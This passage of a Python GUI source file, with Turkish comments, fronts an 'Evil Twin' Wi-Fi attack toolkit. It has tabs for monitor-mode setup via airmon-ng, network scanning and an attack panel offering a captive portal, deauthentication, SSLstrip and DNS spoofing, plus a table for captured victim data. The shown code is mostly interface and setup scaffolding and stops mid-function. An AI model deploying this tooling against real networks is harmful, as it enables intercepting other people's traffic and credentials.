#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Evil Twin Attack Toolkit - GUI Application
Masaüstü Uygulaması

Bu uygulama Evil Twin saldırılarını grafik arayüz ile yönetmenizi sağlar.
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import subprocess
import threading
import os
import sys
import json
import time
from datetime import datetime

class EvilTwinGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Evil Twin Attack Toolkit - GUI")
        self.root.geometry("1200x800")
        self.root.configure(bg='#2b2b2b')
        
        # Değişkenler
        self.interface_var = tk.StringVar()
        self.target_ssid_var = tk.StringVar()
        self.target_bssid_var = tk.StringVar()
        self.target_channel_var = tk.StringVar()
        self.fake_ssid_var = tk.StringVar()
        self.monitor_interface_var = tk.StringVar()
        
        # Durum değişkenleri
        self.monitor_active = False
        self.scan_active = False
        self.attack_active = False
        
        # Process referansları
        self.scan_process = None
        self.attack_process = None
        
        # Ağ listesi
        self.networks = []
        
        # GUI oluştur
        self.create_widgets()
        self.check_root_privileges()
        
    def create_widgets(self):
        """Ana GUI bileşenlerini oluştur"""
        # Ana stil
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Title.TLabel', font=('Arial', 16, 'bold'), foreground='#ff6b6b')
        style.configure('Header.TLabel', font=('Arial', 12, 'bold'), foreground='#4ecdc4')
        
        # Ana başlık
        title_frame = tk.Frame(self.root, bg='#2b2b2b')
        title_frame.pack(fill='x', padx=10, pady=5)
        
        title_label = ttk.Label(title_frame, text="🔥 Evil Twin Attack Toolkit", style='Title.TLabel')
        title_label.pack()
        
        warning_label = ttk.Label(title_frame, text="⚠️ Sadece eğitim ve etik testler için kullanın!", 
                                 foreground='#ff9f43')
        warning_label.pack()
        
        # Notebook (sekmeler)
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=5)
        
        # Sekmeler oluştur
        self.create_setup_tab()
        self.create_scan_tab()
        self.create_attack_tab()
        self.create_monitor_tab()
        self.create_logs_tab()
        
        # Durum çubuğu
        self.create_status_bar()
        
    def create_setup_tab(self):
        """Kurulum sekmesi"""
        setup_frame = ttk.Frame(self.notebook)
        self.notebook.add(setup_frame, text="🔧 Kurulum")
        
        # Interface seçimi
        interface_frame = ttk.LabelFrame(setup_frame, text="Ağ Arayüzü Seçimi")
        interface_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Label(interface_frame, text="Wi-Fi Interface:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.interface_combo = ttk.Combobox(interface_frame, textvariable=self.interface_var, width=20)
        self.interface_combo.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Button(interface_frame, text="🔍 Arayüzleri Tara", 
                  command=self.scan_interfaces).grid(row=0, column=2, padx=5, pady=5)
        
        # Monitor mode
        monitor_frame = ttk.LabelFrame(setup_frame, text="Monitor Mode")
        monitor_frame.pack(fill='x', padx=10, pady=5)
        
        self.monitor_status_label = ttk.Label(monitor_frame, text="Durum: Pasif", foreground='red')
        self.monitor_status_label.grid(row=0, column=0, sticky='w', padx=5, pady=5)
        
        self.monitor_btn = ttk.Button(monitor_frame, text="📡 Monitor Mode Başlat", 
                                     command=self.toggle_monitor_mode)
        self.monitor_btn.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Button(monitor_frame, text="🛑 Zorla Durdur", 
                  command=self.force_stop_monitor).grid(row=0, column=2, padx=5, pady=5)
        
        # Sistem kontrolü
        system_frame = ttk.LabelFrame(setup_frame, text="Sistem Kontrolü")
        system_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Button(system_frame, text="🔍 Araçları Kontrol Et", 
                  command=self.check_tools).pack(side='left', padx=5, pady=5)
        ttk.Button(system_frame, text="📦 Araçları Yükle", 
                  command=self.install_tools).pack(side='left', padx=5, pady=5)
        ttk.Button(system_frame, text="📄 Manuel Komutlar", 
                  command=self.show_manual_commands).pack(side='left', padx=5, pady=5)
        
    def create_scan_tab(self):
        """Tarama sekmesi"""
        scan_frame = ttk.Frame(self.notebook)
        self.notebook.add(scan_frame, text="📡 Ağ Tarama")
        
        # Tarama kontrolleri
        control_frame = ttk.LabelFrame(scan_frame, text="Tarama Kontrolleri")
        control_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Label(control_frame, text="Tarama Süresi (sn):").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.scan_time_var = tk.StringVar(value="30")
        ttk.Entry(control_frame, textvariable=self.scan_time_var, width=10).grid(row=0, column=1, padx=5, pady=5)
        
        self.scan_btn = ttk.Button(control_frame, text="🔍 Taramayı Başlat", 
                                  command=self.toggle_scan)
        self.scan_btn.grid(row=0, column=2, padx=5, pady=5)
        
        # Gelişmiş tarama seçenekleri
        ttk.Button(control_frame, text="🔍+ Geniş Tarama", 
                  command=self.start_extended_scan).grid(row=0, column=3, padx=5, pady=5)
        
        # Tarama seçenekleri
        options_frame = ttk.Frame(control_frame)
        options_frame.grid(row=1, column=0, columnspan=4, sticky='w', padx=5, pady=5)
        
        self.scan_all_channels_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Tüm kanalları tara", 
                       variable=self.scan_all_channels_var).pack(side='left', padx=5)
        
        # Ağ listesi
        networks_frame = ttk.LabelFrame(scan_frame, text="Bulunan Ağlar")
        networks_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        # Treeview oluştur
        columns = ('No', 'SSID', 'BSSID', 'Kanal', 'Güvenlik', 'Sinyal')
        self.networks_tree = ttk.Treeview(networks_frame, columns=columns, show='headings', height=15)
        
        for col in columns:
            self.networks_tree.heading(col, text=col)
            self.networks_tree.column(col, width=120)
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(networks_frame, orient='vertical', command=self.networks_tree.yview)
        self.networks_tree.configure(yscrollcommand=scrollbar.set)
        
        self.networks_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        # Ağ seçimi
        select_frame = ttk.Frame(scan_frame)
        select_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Button(select_frame, text="✅ Seçili Ağı Hedef Yap", 
                  command=self.select_target_network).pack(side='left', padx=5)
        ttk.Button(select_frame, text="💾 Sonuçları Kaydet", 
                  command=self.save_scan_results).pack(side='left', padx=5)
        
    def create_attack_tab(self):
        """Saldırı sekmesi"""
        attack_frame = ttk.Frame(self.notebook)
        self.notebook.add(attack_frame, text="⚔️ Evil Twin Saldırı")
        
        # Hedef bilgileri
        target_frame = ttk.LabelFrame(attack_frame, text="Hedef Ağ Bilgileri")
        target_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Label(target_frame, text="Hedef SSID:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        ttk.Entry(target_frame, textvariable=self.target_ssid_var, width=30).grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(target_frame, text="Hedef BSSID:").grid(row=1, column=0, sticky='w', padx=5, pady=5)
        ttk.Entry(target_frame, textvariable=self.target_bssid_var, width=30).grid(row=1, column=1, padx=5, pady=5)
        
        ttk.Label(target_frame, text="Kanal:").grid(row=2, column=0, sticky='w', padx=5, pady=5)
        ttk.Entry(target_frame, textvariable=self.target_channel_var, width=10).grid(row=2, column=1, sticky='w', padx=5, pady=5)
        
        ttk.Label(target_frame, text="Sahte SSID:").grid(row=3, column=0, sticky='w', padx=5, pady=5)
        ttk.Entry(target_frame, textvariable=self.fake_ssid_var, width=30).grid(row=3, column=1, padx=5, pady=5)
        
        # Saldırı seçenekleri
        options_frame = ttk.LabelFrame(attack_frame, text="Saldırı Seçenekleri")
        options_frame.pack(fill='x', padx=10, pady=5)
        
        self.captive_portal_var = tk.BooleanVar(value=True)
        self.deauth_var = tk.BooleanVar(value=False)
        self.sslstrip_var = tk.BooleanVar(value=False)
        self.dns_spoof_var = tk.BooleanVar(value=False)
        
        ttk.Checkbutton(options_frame, text="📱 Captive Portal", 
                       variable=self.captive_portal_var).grid(row=0, column=0, sticky='w', padx=5, pady=5)
        ttk.Checkbutton(options_frame, text="💥 Deauth Saldırı", 
                       variable=self.deauth_var).grid(row=0, column=1, sticky='w', padx=5, pady=5)
        ttk.Checkbutton(options_frame, text="🔓 SSLstrip", 
                       variable=self.sslstrip_var).grid(row=1, column=0, sticky='w', padx=5, pady=5)
        ttk.Checkbutton(options_frame, text="🌐 DNS Spoofing", 
                       variable=self.dns_spoof_var).grid(row=1, column=1, sticky='w', padx=5, pady=5)
        
        # Saldırı kontrolleri
        control_frame = ttk.Frame(attack_frame)
        control_frame.pack(fill='x', padx=10, pady=10)
        
        self.attack_btn = ttk.Button(control_frame, text="🚀 Saldırıyı Başlat", 
                                    command=self.start_attack, style='Accent.TButton')
        self.attack_btn.pack(side='left', padx=5)
        
        self.stop_btn = ttk.Button(control_frame, text="🛑 Saldırıyı Durdur", 
                                  command=self.stop_attack, state='disabled')
        self.stop_btn.pack(side='left', padx=5)
        
        # Durum göstergesi
        status_frame = ttk.LabelFrame(attack_frame, text="Saldırı Durumu")
        status_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        self.attack_status_text = scrolledtext.ScrolledText(status_frame, height=10, 
                                                           bg='#1e1e1e', fg='#00ff00', 
                                                           font=('Consolas', 10))
        self.attack_status_text.pack(fill='both', expand=True, padx=5, pady=5)
        
    def create_monitor_tab(self):
        """İzleme sekmesi"""
        monitor_frame = ttk.Frame(self.notebook)
        self.notebook.add(monitor_frame, text="📊 İzleme")
        
        # Bağlı istemciler
        clients_frame = ttk.LabelFrame(monitor_frame, text="Bağlı İstemciler")
        clients_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        # İstemci listesi
        client_columns = ('MAC', 'IP', 'Hostname', 'Bağlantı Zamanı')
        self.clients_tree = ttk.Treeview(clients_frame, columns=client_columns, show='headings', height=8)
        
        for col in client_columns:
            self.clients_tree.heading(col, text=col)
            self.clients_tree.column(col, width=150)
        
        self.clients_tree.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Yakalanan veriler
        captured_frame = ttk.LabelFrame(monitor_frame, text="Yakalanan Veriler")
        captured_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        # Veri listesi
        data_columns = ('Zaman', 'İstemci', 'Tür', 'Veri')
        self.captured_tree = ttk.Treeview(captured_frame, columns=data_columns, show='headings', height=8)
        
        for col in data_columns:
            self.captured_tree.heading(col, text=col)
            self.captured_tree.column(col, width=150)
        
        self.captured_tree.pack(fill='both', expand=True, padx=5, pady=5)
        
    def create_logs_tab(self):
        """Log sekmesi"""
        logs_frame = ttk.Frame(self.notebook)
        self.notebook.add(logs_frame, text="📝 Loglar")
        
        # Log kontrolleri
        control_frame = ttk.Frame(logs_frame)
        control_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Button(control_frame, text="🔄 Logları Yenile", 
                  command=self.refresh_logs).pack(side='left', padx=5)
        ttk.Button(control_frame, text="🗑️ Logları Temizle", 
                  command=self.clear_logs).pack(side='left', padx=5)
        ttk.Button(control_frame, text="💾 Logları Kaydet", 
                  command=self.save_logs).pack(side='left', padx=5)
        
        # Log görüntüleyici
        self.logs_text = scrolledtext.ScrolledText(logs_frame, height=25, 
                                                  bg='#1e1e1e', fg='#ffffff', 
                                                  font=('Consolas', 9))
        self.logs_text.pack(fill='both', expand=True, padx=10, pady=5)
        
    def create_status_bar(self):
        """Durum çubuğu oluştur"""
        self.status_frame = tk.Frame(self.root, bg='#2b2b2b', relief='sunken', bd=1)
        self.status_frame.pack(side='bottom', fill='x')
        
        self.status_label = tk.Label(self.status_frame, text="Hazır", bg='#2b2b2b', fg='#ffffff')
        self.status_label.pack(side='left', padx=5)
        
        # Saat
        self.time_label = tk.Label(self.status_frame, bg='#2b2b2b', fg='#ffffff')
        self.time_label.pack(side='right', padx=5)
        self.update_time()
        
    def update_time(self):
        """Saati güncelle"""
        try:
            current_time = datetime.now().strftime("%H:%M:%S")
            if self.time_label and self.time_label.winfo_exists():
                self.time_label.config(text=current_time)
            self._safe_after(1000, self.update_time)
        except (tk.TclError, RuntimeError):
            # Pencere yok edilmişse saati güncellemeyi durdur
            pass
        
    def check_root_privileges(self):
        """Root yetkilerini kontrol et (Windows'ta admin kontrolü)"""
        import platform
        
        if platform.system() == "Windows":
            try:
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin()
                if not is_admin:
                    self._safe_messagebox("showwarning",
                        "Yetki Uyarısı",
                        "Bu uygulama yönetici yetkileri gerektirebilir.\n\nBazı özellikler çalışmayabilir."
                    )
                return True  # Windows'ta devam et
            except:
                return True  # Hata durumunda devam et
        else:
            # Linux/Unix sistemler için
            if os.geteuid() != 0:
                self._safe_messagebox("showwarning", "Yetki Uyarısı", 
                                     "Bu uygulama root yetkileri gerektirir.\n"
                                     "Lütfen 'sudo python3 evil_twin_gui.py' ile çalıştırın.")
            return True
            
    def log_message(self, message, level="INFO"):
        """Log mesajı ekle"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}\n"
        
        try:
            if hasattr(self, 'logs_text') and self.logs_text and self.logs_text.winfo_exists():
                self.logs_text.insert(tk.END, log_entry)
                self.logs_text.see(tk.END)
            
            # Durum çubuğunu güncelle
            if hasattr(self, 'status_label') and self.status_label and self.status_label.winfo_exists():
                self.status_label.config(text=message)
        except (tk.TclError, RuntimeError):
            # Widget yok edilmişse konsola yaz
            print(log_entry.strip())
        except Exception as e:
            print(f"Log hatası: {e} - {log_entry.strip()}")
        
    def scan_interfaces(self):
        """Mevcut ağ arayüzlerini tara"""
        import platform
        
        try:
            if platform.system() == "Windows":
                # Windows'ta netsh ile WiFi adaptörlerini listele
                result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                      capture_output=True, text=True, encoding='cp1254')
                interfaces = []
                
                for line in result.stdout.split('\n'):
                    if 'Name' in line and 'Wi-Fi' in line:
                        # "Name                   : Wi-Fi" formatından interface adını çıkar
                        interface = line.split(':')[1].strip()
                        interfaces.append(interface)
                
                if not interfaces:
                    # Alternatif yöntem
                    interfaces = ['Wi-Fi', 'WLAN']
                    
            else:
                # Linux/Unix için iwconfig
                result = subprocess.run(['iwconfig'], capture_output=True, text=True)
                interfaces = []
                
                for line in result.stdout.split('\n'):
                    if 'IEEE 802.11' in line:
                        interface = line.split()[0]
                        interfaces.append(interface)
            
            self.interface_combo['values'] = interfaces
            if interfaces:
                self.interface_combo.set(interfaces[0])
                self.log_message(f"{len(interfaces)} adet Wi-Fi arayüzü bulundu")
                # Monitor mode durumunu kontrol et (sadece Linux'ta)
                if platform.system() != "Windows":
                    self.check_monitor_status()
            else:
                self.log_message("Wi-Fi arayüzü bulunamadı", "WARNING")
                
        except Exception as e:
            self.log_message(f"Arayüz tarama hatası: {e}", "ERROR")
            
    def check_monitor_status(self):
        """Mevcut monitor mode durumunu kontrol et"""
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'Mode:Monitor' in line:
                    interface = line.split()[0]
                    self.monitor_active = True
                    self.monitor_status_label.config(text="Durum: Aktif", foreground='green')
                    self.monitor_btn.config(text="📡 Monitor Mode Durdur")
                    self.monitor_interface_var.set(interface)
                    self.log_message(f"Monitor mode zaten aktif: {interface}")
                    return
            
            # Monitor mode bulunamadı
            self.monitor_active = False
            self.monitor_status_label.config(text="Durum: Pasif", foreground='red')
            self.monitor_btn.config(text="📡 Monitor Mode Başlat")
            
        except Exception as e:
            self.log_message(f"Monitor mode kontrol hatası: {e}", "ERROR")
            
    def toggle_monitor_mode(self):
        """Monitor mode'u aç/kapat"""
        if not self.monitor_active:
            self.start_monitor_mode()
        else:
            self.stop_monitor_mode()
            
    def start_monitor_mode(self):
        """Monitor mode'u başlat"""
        import platform
        
        # Windows kontrolü
        if platform.system() == "Windows":
            self._safe_messagebox("showwarning",
                "Platform Uyarısı",
                "Bu özellik Linux/Unix sistemlerde çalışır.\n\n"
                "Windows'ta WiFi monitor mode için:\n"
                "• Kali Linux (WSL2) kullanın\n"
                "• VirtualBox/VMware ile Linux VM\n"
                "• Dual boot Linux sistemi"
            )
            self.log_message("Monitor mode Windows'ta desteklenmiyor", "WARNING")
            return
            
        interface = self.interface_var.get()
        if not interface:
            self._safe_messagebox("showerror", "Hata", "Lütfen bir arayüz seçin")
            return
            
        # Basit ve doğrudan yöntem (kullanıcının önerdiği gibi)
        try:
            self.log_message("Monitor mode başlatılıyor (basit yöntem)...")
            
            # 1. Çakışan servisleri durdur
            self.log_message("Çakışan servisler durduruluyor...")
            result1 = subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                                   capture_output=True, text=True)
            
            # 2. Monitor mode başlat
            self.log_message(f"Monitor mode başlatılıyor: {interface}")
            result2 = subprocess.run(['sudo', 'airmon-ng', 'start', interface], 
                                   capture_output=True, text=True)
            
            # 3. Biraz bekle (interface'in hazır olması için)
            import time
            time.sleep(2)
            
            # 4. Başarı kontrolü - önce mevcut monitor interface'leri kontrol et
            monitor_interface = f"{interface}mon"
            
            # iwconfig ile kontrol et
            result3 = subprocess.run(['iwconfig'], capture_output=True, text=True)
            
            # Monitor interface'i bul
            monitor_found = False
            if result3.returncode == 0:
                for line in result3.stdout.split('\n'):
                    if monitor_interface in line and 'Mode:Monitor' in line:
                        monitor_found = True
                        break
                    # Bazen farklı isimle oluşabilir (wlan0mon, wlp2s0mon vs)
                    elif 'Mode:Monitor' in line and interface in line:
                        # Satırın başındaki interface adını al
                        parts = line.split()
                        if len(parts) > 0:
                            monitor_interface = parts[0]
                            monitor_found = True
                            break
            
            if monitor_found:
                self.monitor_active = True
                self.monitor_status_label.config(text="Durum: Aktif", foreground='green')
                self.monitor_btn.config(text="📡 Monitor Mode Durdur")
                self.monitor_interface_var.set(monitor_interface)
                
                self.log_message(f"✅ Monitor mode başarıyla aktif: {monitor_interface}")
                self._safe_messagebox("showinfo", "Başarılı", 
                                    f"Monitor mode aktif: {monitor_interface}")
            else:
                self.log_message("Basit yöntem başarısız, manuel kontrol gerekli", "WARNING")
                self._safe_messagebox("showwarning", "Manuel Kontrol Gerekli", 
                    "Monitor mode başlatılamadı.\n\nManuel olarak terminal'de deneyin:\n" +
                    "1. iwconfig\n" +
                    "2. sudo airmon-ng check kill\n" +
                    "3. sudo airmon-ng start " + interface + "\n" +
                    "4. iwconfig")
                
        except Exception as e:
            self.log_message(f"Monitor mode hatası: {e}", "ERROR")
            self._safe_messagebox("showerror", "Hata", 
                f"Monitor mode başlatılamadı: {e}\n\nManuel olarak terminal'de deneyin:\n" +
                "1. iwconfig\n" +
                "2. sudo airmon-ng check kill\n" +
                "3. sudo airmon-ng start " + interface + "\n" +
                "4. iwconfig")
            
    def stop_monitor_mode(self):
        """Monitor mode'u durdur"""
        try:
            interface = self.interface_var.get()
            monitor_interface = self.monitor_interface_var.get() or f"{interface}mon"
            
            self.log_message("Monitor mode durduruluyor...")
            
            # Basit ve doğrudan yöntem - tüm olası interface'leri dene
            possible_interfaces = [
                monitor_interface,
                f"{interface}mon",
                interface,
                "wlan0mon",
                "wlp2s0mon",
                "wlx*mon"  # USB WiFi adapters
            ]
            
            monitor_stopped = False
            
            # Önce mevcut monitor interface'leri bul
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Mode:Monitor' in line:
                        # Monitor mode'da çalışan interface'i bul
                        parts = line.split()
                        if len(parts) > 0:
                            actual_monitor = parts[0]
                            self.log_message(f"Aktif monitor interface bulundu: {actual_monitor}")
                            
                            # Bu interface'i durdur
                            stop_result = subprocess.run(['sudo', 'airmon-ng', 'stop', actual_monitor], 
                                                        capture_output=True, text=True)
                            
                            if stop_result.returncode == 0:
                                monitor_stopped = True
                                self.log_message(f"✅ {actual_monitor} başarıyla durduruldu")
                                break
            
            # Eğer hiçbir monitor interface bulunamazsa, hepsini dene
            if not monitor_stopped:
                for iface in possible_interfaces:
                    if '*' in iface:  # Wildcard interface'leri atla
                        continue
                    try:
                        result = subprocess.run(['sudo', 'airmon-ng', 'stop', iface], 
                                              capture_output=True, text=True, timeout=5)
                        if result.returncode == 0:
                            monitor_stopped = True
                            self.log_message(f"✅ {iface} başarıyla durduruldu")
                            break
                    except:
                        continue
            
            # Biraz bekle ve kontrol et
            import time
            time.sleep(1)
            
            # Son kontrol - hiçbir monitor interface kalmış mı?
            check_result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            
            still_has_monitor = False
            if check_result.returncode == 0:
                for line in check_result.stdout.split('\n'):
                    if 'Mode:Monitor' in line:
                        still_has_monitor = True
                        break
            
            if not still_has_monitor or monitor_stopped:
                self.monitor_active = False
                self.monitor_status_label.config(text="Durum: Pasif", foreground='red')
                self.monitor_btn.config(text="📡 Monitor Mode Başlat")
                self.monitor_interface_var.set("")
                self.log_message("✅ Monitor mode başarıyla durduruldu")
            else:
                # Gerçekten durdurulamadıysa, kullanıcıya basit çözüm öner
                self.log_message("Monitor mode otomatik durdurulamadı", "WARNING")
                self._safe_messagebox("showwarning", "Manuel Durdurma Gerekli",
                    "Monitor mode durdurulamadı.\n\n" +
                    "Terminal'de bu komutu çalıştırın:\n" +
                    "sudo airmon-ng check kill\n" +
                    "sudo systemctl restart NetworkManager")
            
        except Exception as e:
            self.log_message(f"Monitor mode durdurma hatası: {e}", "ERROR")
    
    def force_stop_monitor(self):
        """Tüm monitor interface'leri zorla durdur"""
        try:
            self.log_message("Tüm monitor interface'ler zorla durduruluyor...")
            
            # 1. Airmon-ng check kill - tüm çakışan servisleri durdur
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                         capture_output=True, text=True)
            
            # 2. Tüm monitor interface'leri bul ve durdur
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Mode:Monitor' in line:
                        parts = line.split()
                        if len(parts) > 0:
                            monitor_iface = parts[0]
                            subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface], 
                                         capture_output=True, text=True)
                            self.log_message(f"Zorla durduruldu: {monitor_iface}")
            
            # 3. NetworkManager'i yeniden başlat
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], 
                         capture_output=True, text=True)
            
            # 4. Durum güncelle
            self.monitor_active = False
            self.monitor_status_label.config(text="Durum: Pasif", foreground='red')
            self.monitor_btn.config(text="📡 Monitor Mode Başlat")
            self.monitor_interface_var.set("")
            
            self.log_message("✅ Tüm monitor interface'ler zorla durduruldu")
            self._safe_messagebox("showinfo", "Başarılı", 
                                "Tüm monitor interface'ler durduruldu.\nNetworkManager yeniden başlatıldı.")
            
        except Exception as e:
            self.log_message(f"Zorla durdurma hatası: {e}", "ERROR")
            
    def check_tools(self):
        """Gerekli araçları kontrol et"""
        tools = ['aircrack-ng', 'hostapd', 'dnsmasq', 'iptables']
        missing_tools = []
        
        for tool in tools:
            result = subprocess.run(['which', tool], capture_output=True)
            if result.returncode != 0:
                missing_tools.append(tool)
                
        if missing_tools:
            message = f"Eksik araçlar: {', '.join(missing_tools)}"
            self.log_message(message, "WARNING")
            self._safe_messagebox("showwarning", "Eksik Araçlar", message)
        else:
            self.log_message("Tüm araçlar mevcut")
            self._safe_messagebox("showinfo", "Araç Kontrolü", "Tüm gerekli araçlar mevcut")
            
    def _safe_messagebox(self, method_name, title, message):
        """Güvenli messagebox gösterimi - pencere yok edilmişse hata vermez"""
        try:
            # Pencere hala var mı kontrol et
            if self.root and self.root.winfo_exists():
                method = getattr(messagebox, method_name)
                return method(title, message)
            else:
                # Pencere yok edilmişse sadece log'a yaz
                try:
                    self.log_message(f"{title}: {message}")
                except:
                    print(f"{title}: {message}")
                return False  # askyesno için güvenli varsayılan
        except (tk.TclError, RuntimeError):
            # Tkinter context artık geçerli değilse sadece konsola yaz
            print(f"{title}: {message}")
            return False
        except Exception as e:
            print(f"Messagebox gösterim hatası: {e}")
            return False
    
    def _safe_after(self, delay, func):
        """Güvenli root.after - pencere yok edilmişse hata vermez"""
        try:
            if self.root and self.root.winfo_exists():
                return self.root.after(delay, func)
        except (tk.TclError, RuntimeError):
            # Pencere yok edilmişse sessizce geç
            pass
        except Exception as e:
            print(f"After call hatası: {e}")
    
    def _safe_askyesno(self, title, message):
        """Güvenli askyesno - pencere yok edilmişse False döner"""
        return self._safe_messagebox("askyesno", title, message)
    
    def _safe_widget_config(self, widget, **kwargs):
        """Güvenli widget config"""
        try:
            if widget and widget.winfo_exists():
                widget.config(**kwargs)
        except (tk.TclError, RuntimeError):
            pass
    
    def _safe_treeview_insert(self, network):
        """Güvenli treeview insert"""
        try:
            if self.networks_tree and self.networks_tree.winfo_exists():
                self.networks_tree.insert('', 'end', values=(
                    network['no'], network['ssid'], network['bssid'], 
                    network['channel'], network['security'], network['signal']
                ))
        except (tk.TclError, RuntimeError):
            pass
    
    def _safe_text_insert(self, text_widget, content):
        """Güvenli text widget insert"""
        try:
            if text_widget and text_widget.winfo_exists():
                text_widget.insert(tk.END, content)
        except (tk.TclError, RuntimeError):
            pass
    
    def _safe_text_see_end(self, text_widget):
        """Güvenli text widget see end"""
        try:
            if text_widget and text_widget.winfo_exists():
                text_widget.see(tk.END)
        except (tk.TclError, RuntimeError):
            pass
            
    def install_tools(self):
        """Araçları yükle"""
        try:
            # GUI dosyasının bulunduğu klasörün parent dizinini al (evil-twin ana klasörü)
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            cmd = ['sudo', './setup/install_tools.sh']
            subprocess.Popen(cmd, cwd=script_dir)
            self.log_message("Araç yükleme başlatıldı")
            
        except Exception as e:
            self.log_message(f"Araç yükleme hatası: {e}", "ERROR")
    
    def show_manual_commands(self):
        """Manuel monitor mode komutlarını göster"""
        commands = """📄 Manuel Monitor Mode Komutları:

✅ MONITOR MODE BAŞLATMA:
# 1. Wi-Fi arayüzünü bul
iwconfig

# 2. Gerekli servisleri durdur
sudo airmon-ng check kill

# 3. Monitor moda al
sudo airmon-ng start wlan0

# 4. Kontrol et
iwconfig wlan0mon

❌ MONITOR MODE DURDURMA:
# 1. Monitor interface'i durdur
sudo airmon-ng stop wlan0mon

# 2. NetworkManager'i başlat
sudo systemctl restart NetworkManager

🆘 SORUN ÇÖZME:
# Eğer monitor mode durmuyor:
sudo airmon-ng check kill
sudo killall airodump-ng
sudo killall airmon-ng
sudo systemctl restart NetworkManager

💡 Bu komutlar terminal'de çalıştırılabilir."""
        
        self._safe_messagebox("showinfo", "Manuel Komutlar", commands)
            
    def start_scan(self):
        """Ağ taramasını başlat"""
        import platform
        
        if platform.system() == "Windows":
            self._safe_messagebox("showwarning",
                "Platform Uyarısı",
                "Ağ tarama özelliği Linux/Unix sistemlerde çalışır.\n\n"
                "Windows'ta WiFi ağları görmek için:\n"
                "• Kali Linux (WSL2) kullanın\n"
                "• VirtualBox/VMware ile Linux VM\n"
                "• Windows WiFi ayarlarını kontrol edin"
            )
            self.log_message("Ağ tarama Windows'ta desteklenmiyor", "WARNING")
            return
            
        if not self.monitor_active:
            self._safe_messagebox("showerror", "Hata", "Önce monitor mode'u başlatın")
            return
            
        if self.scan_active:
            self._safe_messagebox("showwarning", "Uyarı", "Tarama zaten aktif")
            return
            
        self.scan_active = True
        try:
            self.scan_btn.config(text="🚫 Durdurmak için tıkla", state='normal')
        except (tk.TclError, RuntimeError):
            pass
    
    def start_extended_scan(self):
        """Geniş ağ taraması - daha fazla ağ bulmaya odaklı"""
        import platform
        
        if platform.system() == "Windows":
            self._safe_messagebox("showwarning",
                "Platform Uyarısı",
                "Ağ tarama özelliği Linux/Unix sistemlerde çalışır.\n\n"
                "Windows'ta WiFi ağları görmek için:\n"
                "• Kali Linux (WSL2) kullanın\n"
                "• VirtualBox/VMware ile Linux VM\n"
                "• Windows WiFi ayarlarını kontrol edin"
            )
            self.log_message("Ağ tarama Windows'ta desteklenmiyor", "WARNING")
            return
            
        if not self.monitor_active:
            self._safe_messagebox("showerror", "Hata", "Önce monitor mode'u başlatın")
            return
            
        if self.scan_active:
            self._safe_messagebox("showwarning", "Uyarı", "Tarama zaten aktif")
            return
        
        # Geniş tarama için daha uzun süre
        original_time = self.scan_time_var.get()
        self.scan_time_var.set("60")  # 60 saniye
        
        self.log_message("Geniş ağ taraması başlatılıyor (60 saniye, tüm kanallar)...")
        
        self.scan_active = True
        try:
            self.scan_btn.config(text="⏳ Geniş Tarama... (🚫 Durdurmak için tıkla)", state='normal')
        except (tk.TclError, RuntimeError):
            pass
        
        # Ağ listesini temizle
        for item in self.networks_tree.get_children():
            self.networks_tree.delete(item)
            
        # Geniş taramayı thread'de başlat
        scan_thread = threading.Thread(target=self._extended_scan_networks)
        scan_thread.daemon = True
        scan_thread.start()
        
        # Orijinal süreyi geri yükle
        def restore_time():
            self.scan_time_var.set(original_time)
        self._safe_after(1000, restore_time)  # 1 saniye sonra geri yükle
        
        # Ağ listesini temizle
        for item in self.networks_tree.get_children():
            self.networks_tree.delete(item)
            
        # Taramayı thread'de başlat
        scan_thread = threading.Thread(target=self._scan_networks)
        scan_thread.daemon = True
        scan_thread.start()
        
    def toggle_scan(self):
        """Tarama başlat/durdur"""
        if not self.scan_active:
            self.start_scan()
        else:
            self.stop_scan()
    
    def stop_scan(self):
        """Taramayı durdur"""
        self.scan_active = False
        self.log_message("Tarama durduruldu")
        try:
            self.scan_btn.config(text="🔍 Taramayı Başlat", state='normal')
        except (tk.TclError, RuntimeError):
            pass
        
    def _scan_networks(self):
        """Ağ tarama işlemi (thread) - Basit airodump-ng kullanımı"""
        try:
            scan_time = int(self.scan_time_var.get())
            monitor_interface = self.monitor_interface_var.get()
            
            if not monitor_interface:
